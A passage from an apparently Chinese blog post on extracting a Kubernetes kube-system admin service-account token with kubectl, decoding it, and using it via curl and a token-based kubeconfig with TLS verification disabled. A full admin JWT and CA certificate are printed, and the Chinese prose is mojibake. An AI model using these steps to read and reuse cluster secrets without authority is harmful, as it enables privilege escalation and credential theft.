ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br>kind: Secret<br>metadata:<br>  annotations:<br>    kubernetes.io/service-account.name: admin<br>    kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br>  creationTimestamp: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span><br>  name: admin-token-2qdsz<br>  namespace: kube-system<br>  resourceVersion: <span class="hljs-string">&quot;2962635&quot;</span><br>  selfLink: /api/v1/namespaces/kube-system/secrets/admin-token-2qdsz<br>  uid: 41e80ab2-3840-4cde-bad8-cdad915bbcc9<br><span class="hljs-built_in">type</span>: kubernetes.io/service-account-token<br><br><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ jsonpath çš„æ–¹å¼ç›´æ¥è·å– token çš„å€¼ï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;</span><br>ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br><br><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 -d</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 --decode</span><br>eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šLinux å’Œ Mac æœ‰è‡ªå¸¦çš„ base64 å‘½ä»¤ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œè¾“å…¥ base64 æ˜¯è¿›è¡Œç¼–ç ï¼ŒLinux ä¸­base64 -d è¡¨ç¤ºè§£ç ï¼ŒMac ä¸­ä½¿ç”¨ base64 -Dã€‚</p><h1 id="apiè®¿é—®"><a href="#apiè®¿é—®" class="headerlink" title="apiè®¿é—®"></a>apiè®¿é—®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl https://192.168.56.168:6443/api --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;APIVersions&quot;</span>,<br>  <span class="hljs-string">&quot;versions&quot;</span>: [<br>    <span class="hljs-string">&quot;v1&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;serverAddressByClientCIDRs&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;clientCIDR&quot;</span>: <span class="hljs-string">&quot;0.0.0.0/0&quot;</span>,<br>      <span class="hljs-string">&quot;serverAddress&quot;</span>: <span class="hljs-string">&quot;192.168.56.168:6443&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br><br><span class="hljs-comment"># TOKEN=$(kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 --decode)</span><br><span class="hljs-comment"># APISERVER=https://192.168.56.168:6443</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;APIVersions&quot;</span>,<br>  <span class="hljs-string">&quot;versions&quot;</span>: [<br>    <span class="hljs-string">&quot;v1&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;serverAddressByClientCIDRs&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;clientCIDR&quot;</span>: <span class="hljs-string">&quot;0.0.0.0/0&quot;</span>,<br>      <span class="hljs-string">&quot;serverAddress&quot;</span>: <span class="hljs-string">&quot;192.168.56.168:6443&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/nodes --header &quot;Authorization: Bearer $TOKEN&quot; --insecure </span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/default/secrets --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Secret&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;kube-system&quot;</span>,<br>    <span class="hljs-string">&quot;selfLink&quot;</span>: <span class="hljs-string">&quot;/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-string">&quot;41e80ab2-3840-4cde-bad8-cdad915bbcc9&quot;</span>,<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: <span class="hljs-string">&quot;2962635&quot;</span>,<br>    <span class="hljs-string">&quot;creationTimestamp&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>    <span class="hljs-string">&quot;annotations&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.uid&quot;</span>: <span class="hljs-string">&quot;4fe95396-6de8-4097-9ff9-4232f0151c71&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;managedFields&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;manager&quot;</span>: <span class="hljs-string">&quot;kube-controller-manager&quot;</span>,<br>        <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;Update&quot;</span>,<br>        <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>        <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsType&quot;</span>: <span class="hljs-string">&quot;FieldsV1&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsV1&quot;</span>: &#123;<span class="hljs-string">&quot;f:data&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:ca.crt&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:namespace&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:token&quot;</span>:&#123;&#125;&#125;,<span class="hljs-string">&quot;f:metadata&quot;</span>:&#123;<span class="hljs-string">&quot;f:annotations&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.name&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.uid&quot;</span>:&#123;&#125;&#125;&#125;,<span class="hljs-string">&quot;f:type&quot;</span>:&#123;&#125;&#125;<br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ca.crt&quot;</span>: <span class="hljs-string">&quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;a3ViZS1zeXN0ZW0=&quot;</span>,<br>    <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=&quot;</span>   <span class="hljs-comment"># base64ç¼–ç åçš„</span><br>  &#125;,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;kubernetes.io/service-account-token&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="kubeconfig-token"><a href="#kubeconfig-token" class="headerlink" title="kubeconfig (token)"></a>kubeconfig (token)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>clusters:<br>- cluster:<br>    insecure-skip-tls-verify: <span class="hljs-literal">true</span><br>    server: https://192.168.56.168:6443<br>  name: kubernetes<br>contexts:<br>- context:<br>    cluster: kubernetes<br>    user: system:admin<br>  name: system:admin<br>current-context: system:admin<br>kind: Config<br>preferences: &#123;&#125;<br><span class="hljs-built_in">users</span>:<br>- name: system:admin<br>  user:<br>    token: eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl --kubeconfig kubeconfig-168-token get secret -A å¯ç”¨</span><br><span class="hljs-comment"># kubectl --kubeconfig kubeconfig-168-token get pod -A    å¯ç”¨</span><br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“ï¼štokenç¼–è§£ç "><a href="#æ€»ç»“ï¼štokenç¼–è§£ç " class="headerlink" title="æ€»ç»“ï¼štokenç¼–è§£ç "></a>æ€»ç»“ï¼štokenç¼–è§£ç </h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64è§£ç åçš„å€¼</span><br><span class="hljs-comment"># kubectl -n kube-system describe secret admin-token-2qdsz</span><br>Name:         admin-token-2qdsz<br>Namespace:    kube-system<br>Labels:       &lt;none&gt;<br>Annotations:  kubernetes.io/service-account.name: admin<br>              kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br><br>Type:  kubernetes.io/service-account-token<br><br>Data<br>====<br>ca.crt:     1359 bytes<br>namespace:  11 bytes<br>token:      